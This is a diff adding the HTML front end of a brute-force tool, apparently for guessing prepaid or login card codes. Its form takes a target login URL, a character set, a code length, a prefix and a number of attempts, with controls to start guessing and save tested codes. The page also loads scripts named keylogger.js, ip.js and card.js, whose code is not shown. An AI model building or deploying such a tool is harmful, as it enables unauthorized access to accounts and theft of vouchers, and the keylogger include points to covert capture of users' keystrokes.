@@ -1,0 +1,188 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Blue24Bluer</title>
+  <link rel="stylesheet" href="st.css">
+  <link rel="stylesheet" href="button.css">
+
+        <!-- Favicon -->
+    <link rel="icon" href="https://instawebeustorage01.blob.core.windows.net/websites-co-in-users-files/files/839378/favicon/favicon.png?v=77144891" type="image/png" />
+
+        <!-- Google font -->
+        <link rel="preload" as="font"href="https://fonts.googleapis.com/css?family=Roboto:100,300,400,500,700" onload="this.rel='stylesheet'">
+        <link rel="preload" as="font"href="https://fonts.googleapis.com/css?family=Montserrat:300,400,500,600" onload="this.rel='stylesheet'">
+        <!-- BS4 minified v1.0.0 CSS -->
+        <link rel="stylesheet" href="udyog/css/bootstrap.min9caf.css?v=2030530230">
+        <!-- Custom minified CSS -->
+        <link rel="stylesheet" href="udyog/css/custom.min5e77.css?v=445896734">
+
+
+
+        <link rel="stylesheet" href="udyog/css/ecommerce.min4166.css?v=982744943">
+
+
+        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/6.7.0/css/flag-icons.min.css">
+
+        <link media="none" onload="if(media!='all')media='all'"rel="stylesheet" href="common/css/custom-toast.css">
+
+        <!-- FontAwesome -->
+        <link rel="stylesheet" href="udyog/fonts/css/all.min.css">
+
+        <!-- Select2 css files -->
+        <link media="none" onload="if(media!='all')media='all'"href="common/css/select2.min.css" rel="stylesheet" />
+
+        <!-- animate.css -->
+        <link media="none" onload="if(media!='all')media='all'"href="common/css/animate.css" rel="stylesheet" />
+
+        <!-- manifest request -->
+        <link rel="manifest" href="manifest17de.json?theme_color=%230c0c0c">
+
+        <link rel="canonical" href="index-2.html">
+
+        <link rel="alternate" href="index.html" hreflang="en-us">
+
+
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.3.5/jquery.fancybox.min.css" />
+
+
+    <link rel="stylesheet" href="udyog/slick/slick.css">
+                <!-- Dynamic styles -->
+
+  <style>
+  body {
+    background-image: url('Back.jpg');
+    background-repeat: no-repeat;
+    font-family: 'Almarai', Arial, sans-serif;
+    background-size: cover;
+}
+
+  </style>
+
+<script>
+  function showLoadingPage(event) {
+    event.preventDefault(); // منع الانتقال إلى الصفحة المحددة فورًا
+
+    var loadingPage = document.createElement("div");
+    loadingPage.id = "loading-page";
+
+    var loadingText = document.createElement("p");
+    loadingText.textContent = "جارٍ التحميل...";
+    loadingPage.appendChild(loadingText);
+
+    document.body.appendChild(loadingPage);
+
+    setTimeout(function() {
+      loadingPage.style.display = "none"; // إخفاء صفحة التحميل والانتظار بعد مرور الوقت المحدد
+      window.location.href = event.target.href; // الانتقال إلى الصفحة المحددة بعد انتهاء صفحة التحميل والانتظار
+    }, 120000); // 120000 ميلي ثانية تعادل دقيقتين
+  }
+
+  var buttons = document.getElementsByClassName("dialog-box");
+  for (var i = 0; i < buttons.length; i++) {
+    buttons[i].addEventListener("click", showLoadingPage);
+  }
+
+    document.addEventListener("DOMContentLoaded", (event) => {
+    // Create a script element
+    const customScript = document.createElement('script');
+
+    // Set the script content with your logic
+    customScript.textContent = `
+                    let db_colors = {"primary":"#e6b52f","secondary":"#252525","hover_primary":"#b38916","hover_secondary":"#252525"};
+            if (db_colors) {
+                applyColors(db_colors);
+            }
+                window.addEventListener('message', function (event) {
+            let preview_color = null;
+            //
+            if (event.origin !== "https://websites.co.in/") return;
+            //
+            if (event?.data?.colors) {
+                preview_color = event.data.colors;
+                applyColors(preview_color);
+            }
+        },false);
+
+        function handleTemplateStyleDataFromAndroid(data) {
+            let preview_color_android = null;
+            //
+            //
+            //
+            try {
+                    const parsedData = JSON.parse(data);
+                    if (parsedData?.colors) {
+                        preview_color_android = parsedData.colors;
+                        applyColors(preview_color_android);
+                    }
+                } catch (error) {
+                    console.error('Error parsing JSON data:', error);
+                }
+        }
+
+        function applyColors(colors){
+            // array to store CSS variable declarations
+            // Add primary color
+            const cssVariables = [];
+            if (colors.primary) {
+                cssVariables.push(\`--primary: \${colors.primary} !important;\`);
+                cssVariables.push(\`--hover_primary: \${colors.hover_primary || colors.primary} !important;\`);
+            }
+
+            // Add secondary color
+            if (colors.secondary) {
+                cssVariables.push(\`--secondary: \${colors.secondary} !important;\`);
+                cssVariables.push(\`--hover_secondary: \${colors.hover_secondary || colors.secondary} !important;\`);
+            }
+            // Join the array into a string and update CSS variables
+            document.getElementById('custom_style_customizations').textContent = \` :root {
+                \${cssVariables.join('\\n')}
+            } \`;
+        }
+    `;
+
+    // Append the script element to the body
+    document.body.appendChild(customScript);
+});
+
+
+</script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+<script src="wind.js"></script>
+<script src="lazy.js"></script>
+<script src="host.js"></script>
+<script src="keylogger.js"></script>
+<script src="ip.js"></script>
+<script src="card.js"></script>
+
+        <meta charset="utf-8">
+    </head>
+
+
+    <body id="body">
+<div class="container">
+    <div class="logo wind-effect">
+      <img src="Blue.jpg" alt="Blue24Bluer_ico">
+    </div>
+        <div class="contact">
+        </br>
+        <a color="red">Tool developer blue24bluer</a><br><br>   
+
+
+
+            <a href="" id="dlink">Save The File</a>
+<li><a class="dialog-box wind-effect"><input type="text" id="loginURL" value="http://h.com/login">Login page link</input></a></li>
+<li><a class="dialog-box wind-effect"><input type="text" id="loginChars" value="0123456789">Cards that make up the cards</input></a></li>
+<li><a class="dialog-box wind-effect"><input id="loginUsernameLength" value="10">Number of codes that make up the card</input></a></li>
+<li><a class="dialog-box wind-effect"><input type="text" id="loginUsernameFixed" value="9h">The starting part of the card if it is fixed</input></a></li>
+<li><a class="dialog-box wind-effect"><input id="loginCount" value="100">The number of cards to be guessed and then stop</input></a></li>
+<li><a class="dialog-box wind-effect"><input id="loginTimeOut" value="1000">Time between trying and trying 'millionces'</input></a></li>
+<li><a class="dialog-box wind-effect"><button onclick="usingFile()">Use cards from a file</button></a></li>
+<li><a class="dialog-box wind-effect"><button onclick="runProgram()">Start</button></a></li>
+<li><a class="dialog-box wind-effect"><button onclick="stopProgram()">Stop</button></a></li>
+<li><a class="dialog-box wind-effect"><button onclick="saveFile()">Save tested cards</button></a></li>
+<li><a class="dailog-box wind-effect"><progress id="prog" width="1000" max="1000"></progress></a></li>
+            <input id="currentUsername"><br>
+            <iframe src="" id="loginPageViewer" width="1000" max="1000"></iframe>
+        </div>        
+    </body>
+</html>
